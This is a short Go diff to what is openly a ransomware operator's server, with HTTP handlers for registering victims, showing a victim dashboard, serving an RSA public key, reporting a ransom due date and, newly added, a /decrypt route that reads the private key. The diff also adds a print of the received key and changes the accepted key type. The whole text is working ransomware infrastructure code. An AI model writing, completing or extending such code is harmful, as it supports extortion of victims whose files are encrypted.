@@ -32,6 +32,8 @@ func DecryptKey(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	fmt.Println(key)
+
 	pemd, err := ioutil.ReadFile("private.pem")
 	if err != nil {
 		http.Error(w, "error reading rsa private key", http.StatusInternalServerError)
@@ -45,7 +47,7 @@ func DecryptKey(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// check that the key is of the right type.
-	if got, want := block.Type, "RSA PRIVATE KEY"; got != want {
+	if got, want := block.Type, "PRIVATE KEY"; got != want {
 		log.Fatalf("unknown key type %q, want %q", got, want)
 	}
 
@@ -230,6 +232,7 @@ func main() {
 	http.HandleFunc("/pubkey", GetRSAPubKey)
 	http.HandleFunc("/register", RegisterNewVictim)
 	http.HandleFunc("/dashboard", ServeVictimsDisplay)
+	http.HandleFunc("/decrypt", DecryptKey)
 	http.HandleFunc("/due", GetRansomwareDueDate)
 
 	// start the http listener
